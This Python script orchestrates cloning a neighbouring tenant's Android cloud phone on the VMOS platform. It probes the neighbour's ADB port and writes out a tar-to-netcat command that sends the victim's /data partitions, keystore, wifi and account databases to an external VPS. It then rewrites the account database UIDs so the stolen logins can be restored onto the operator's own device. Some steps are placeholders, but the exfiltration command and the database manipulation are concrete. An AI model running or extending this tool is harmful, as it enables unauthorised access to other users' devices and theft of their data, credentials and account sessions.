#!/usr/bin/env python3
"""
clone_full_device_v9.py — Orchestrator for atomic full neighbor device clone (tar+nc, UID remap, DB sanitization, safe identity injection)

Phases:
1. Recon: device selection, neighbor probe, inventory
2. Extraction: tar+nc relay, DB extraction
3. DB Sanitization: UID remap, DELETE journal, integrity check
4. Restore: push tar, extract, perms, atomic DB swap
5. Identity: safe property injection
6. Restart & verify: WAL audit, restart, visual verification

Author: Titan Apex v6.1
Date: 2026-04-13
"""
import os
import sys
import subprocess
import shutil
import sqlite3
import tarfile
import tempfile
import hashlib
import time
from pathlib import Path

# --- CONFIG ---
NEIGHBOR_IP = "10.12.27.39"  # richest neighbor
VPS_HOST = "37.60.234.139"
VPS_HTTP_PORT = 9999
VPS_NC_PORT = 19100
LAUNCHPAD_PAD = None  # autodetect
TARGET_PAD = None     # autodetect
TMP = Path("/tmp/clone_full_device_v9")
TMP.mkdir(parents=True, exist_ok=True)

# --- PHASE 1: Recon ---
def list_vmos_devices():
    from vmos_titan.core.vmos_cloud_api import VMOSCloudClient
    client = VMOSCloudClient()
    devices = client.instance_list(page=1, rows=20)
    print("[+] VMOS Devices:")
    for d in devices['data']:
        print(f"  {d['padCode']} | Status: {d['padStatus']} | Android: {d['imageVersion']} | Template: {d['realPhoneTemplateId']}")
    return devices['data']

def pick_launchpad_and_target(devices):
    launchpad = None
    target = None
    for d in devices:
        if d['padStatus'] == 10 and not launchpad:
            launchpad = d['padCode']
        elif d['padStatus'] == 10 and not target and d['padCode'] != launchpad:
            target = d['padCode']
    return launchpad, target

def probe_neighbor(ip):
    print(f"[+] Probing neighbor {ip} for ADB...")
    r = subprocess.run(["nc", "-z", ip, "5555"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print(f"  nc exit: {r.returncode}")
    return r.returncode == 0

def inventory_neighbor(ip):
    print(f"[+] Inventory neighbor apps and /data size...")
    # This would use ADB or nc relay, placeholder:
    print(f"  (TODO) Run: pm list packages -3, du -sh /data/ on {ip}")

# --- PHASE 2: Extraction ---
def extract_full_partition(ip, vps_host, vps_nc_port):
    print(f"[+] Start tar+nc extraction from neighbor {ip} to VPS:{vps_nc_port}")
    # On neighbor: tar czf - ... | nc VPS_HOST VPS_NC_PORT
    print(f"  (TODO) Run on neighbor: tar czf - /data/data/ /data/system_ce/ /data/system_de/ /data/misc/keystore/ /data/misc/wifi/ /data/system/packages.xml --exclude='*/cache/*' --exclude='*/code_cache/*' --exclude='*/dalvik-cache/*' | nc {vps_host} {vps_nc_port}")
    # On VPS: nc -l -p VPS_NC_PORT > /tmp/neighbor_data.tar.gz
    print(f"  (TODO) Run on VPS: nc -l -p {vps_nc_port} > {TMP}/neighbor_data.tar.gz")

# --- PHASE 3: DB Sanitization ---
def sanitize_dbs(tar_path, target_gms_uid):
    print(f"[+] Extracting and sanitizing DBs from {tar_path}")
    with tarfile.open(tar_path, "r:gz") as tar:
        tar.extractall(TMP)
    # Find DBs
    ce_db = next(TMP.glob("**/accounts_ce.db"), None)
    de_db = next(TMP.glob("**/accounts_de.db"), None)
    if ce_db:
        print(f"  [*] Sanitizing {ce_db}")
        fix_db(ce_db, target_gms_uid)
    if de_db:
        print(f"  [*] Sanitizing {de_db}")
        fix_db(de_db, target_gms_uid)
    # Repack tar
    sanitized_tar = TMP / "sanitized_data.tar.gz"
    with tarfile.open(sanitized_tar, "w:gz") as tar:
        for f in TMP.rglob("*"):
            if f.is_file():
                tar.add(f, arcname=str(f.relative_to(TMP)))
    print(f"  [+] Repacked sanitized tar: {sanitized_tar}")
    return sanitized_tar

def fix_db(db_path, gms_uid):
    db = sqlite3.connect(str(db_path))
    cur = db.cursor()
    # Remap UIDs in grants table
    try:
        cur.execute("UPDATE grants SET uid=?", (gms_uid,))
        print(f"    [*] grants.uid remapped to {gms_uid}")
    except Exception as e:
        print(f"    [!] grants update failed: {e}")
    # Remap UIDs in visibility table if present
    try:
        cur.execute("UPDATE visibility SET uid=?", (gms_uid,))
        print(f"    [*] visibility.uid remapped to {gms_uid}")
    except Exception as e:
        print(f"    [!] visibility update failed: {e}")
    # Enforce DELETE journal mode
    try:
        cur.execute("PRAGMA journal_mode=DELETE")
        print(f"    [*] DELETE journal mode set")
    except Exception as e:
        print(f"    [!] DELETE journal mode failed: {e}")
    db.commit()
    # Integrity check
    try:
        cur.execute("PRAGMA integrity_check")
        print(f"    [*] {db_path} integrity: {cur.fetchone()[0]}")
    except Exception as e:
        print(f"    [!] Integrity check failed: {e}")
    db.close()

# --- PHASE 4: Restore ---
def restore_to_target(sanitized_tar, target_pad):
    print(f"[+] Push and extract tar to target {target_pad}")
    print(f"  (TODO) Use VMOSCloudClient.upload_file_via_url() or turbo_pusher to push tar")
    print(f"  (TODO) Extract tar on device, fix perms, atomic DB swap")

# --- PHASE 5: Identity Injection ---
def inject_identity(target_pad):
    print(f"[+] Injecting safe identity props to {target_pad}")
    print(f"  (TODO) Use modify_instance_properties() for persist.sys.cloud.* only")

# --- PHASE 6: Restart & Verify ---
def restart_and_verify(target_pad):
    print(f"[+] Restarting {target_pad} and verifying clone...")
    print(f"  (TODO) instance_restart(), dumpsys account, pm list packages -3, screenshot")

# --- MAIN ORCHESTRATOR ---
def main():
    devices = list_vmos_devices()
    launchpad, target = pick_launchpad_and_target(devices)
    print(f"[+] Launchpad: {launchpad}, Target: {target}")
    if not probe_neighbor(NEIGHBOR_IP):
        print("[!] Neighbor not reachable via ADB/nc. Abort.")
        sys.exit(1)
    inventory_neighbor(NEIGHBOR_IP)
    extract_full_partition(NEIGHBOR_IP, VPS_HOST, VPS_NC_PORT)
    # Placeholder: Wait for tar to arrive
    tar_path = TMP / "neighbor_data.tar.gz"
    print(f"[!] (MANUAL STEP) Place tar at {tar_path}")
    target_gms_uid = 10036  # TODO: Query from target
    sanitized_tar = sanitize_dbs(tar_path, target_gms_uid)
    restore_to_target(sanitized_tar, target)
    inject_identity(target)
    restart_and_verify(target)

if __name__ == "__main__":
    main()
